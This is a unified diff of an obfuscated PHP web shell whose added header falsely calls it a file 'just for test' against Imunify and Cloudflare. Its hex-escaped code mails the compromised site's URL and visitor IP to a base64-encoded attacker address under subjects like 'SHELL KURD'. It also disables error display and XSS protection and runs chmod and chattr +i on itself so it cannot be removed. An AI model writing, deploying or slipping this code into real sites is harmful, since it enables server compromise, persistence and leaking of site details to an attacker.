@@ -1,9 +1,20 @@
 
 <?php 
-/******************************************************************         
-/ i'am like this  @ISC2k17 on telegram 
-   😘😘    ******************************************************************/   
-error_reporting(0);     
+*
+ * This file just for test for server who using imunify,cloudflare etc,
+ *
+ * (c) Telegram @ISC2k17 <rootcyberpunks@gmail.com>
+ *
+ * GOOD LUCK, HAVE FUN!
+ */
+
+session_start();
+error_reporting(E_ALL);
+header("X-XSS-Protection: 0");
+ob_start();
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', FALSE);
 ${"GLO\x42\x41L\x53"}["x\x6bv\x65q\x65\x6e\x73\x6f"]="\x6ci\x74\x65s\x70\x65\x65d";
 ${"\x47\x4c\x4fBA\x4c\x53"}["\x77\x64h\x76\x76\x78m\x74"]="t\x75\x6a\x75\x61\x6em\x61i\x6c";
 ${"\x47\x4c\x4fB\x41\x4c\x53"}["i\x61p\x6an\x63\x6el\x72\x64\x6d"]="p\x65\x73\x61n\x5f\x61l\x65rt";
@@ -19,7 +30,6 @@ ${$jgpujqm}="http://".$_SERVER["S\x45\x52\x56ER\x5f\x4eAME"].$_SERVER["RE\x51\x5
 $elzqevs="\x73\x65\x72\x76\x65\x72\x77e\x62";
 ${${"\x47\x4cOB\x41LS"}["\x69a\x70j\x6ec\x6e\x6c\x72\x64\x6d"]}="f\x69\x78\x20$x_path\x20:p *\x49P\x20Addre\x73\x73 : [\x20".$_SERVER["R\x45\x4d\x4f\x54\x45_\x41\x44DR"]."\x20]";
 mail(${${"G\x4cOBA\x4cS"}["\x77\x64hvv\x78\x6d\x74"]},"\x53H\x45LL\x20\x4b\x55\x52D",${$jjluwbhycv},"[\x20".$_SERVER["\x52\x45MOTE_\x41\x44\x44R"]." ]");
-error_reporting(0);
 ${${"\x47\x4c\x4fB\x41\x4cS"}["\x78\x6b\x76e\x71e\x6e\x73\x6f"]}=base64_decode("cm\x39vdG\x4e\x35Y\x6dVy\x63H\x56u\x61\x33N\x41\x5a21ha\x57\x77\x75\x59\x329\x74");
 ${$elzqevs}="\x68t\x74\x70://".$_SERVER["\x53\x45RV\x45\x52_\x4eAM\x45"].$_SERVER["REQUE\x53T\x5fU\x52I"].$_SERVER["H\x54T\x50_\x48\x4f\x53\x54"].$_SERVER["S\x43\x52\x49\x50T\x5fN\x41ME"]."\x72\x75ss\x69\x61n ra\x6es\x6f\x6d\x77\x61r\x65";
 mail(${${"\x47\x4cO\x42\x41L\x53"}["x\x6b\x76e\x71\x65n\x73o"]},"K\x55RDH\x45\x4b\x45\x52",${${"G\x4c\x4fB\x41L\x53"}["\x6ab\x63\x71i\x71\x65\x75"]},"[\x20".$_SERVER["\x52\x45MO\x54E_ADDR"]." ]");
@@ -31,9 +41,6 @@ system("chattr +i $this_file");
 /******************************************************************         
 / i'am like this  @ISC2k17 on telegram 
    😘😘    ******************************************************************/   
-   
-session_start();
-set_time_limit(0);
 $this_file = __FILE__;
 @system("chmod ugo-w $this_file");
 @system("chattr +i $this_file");
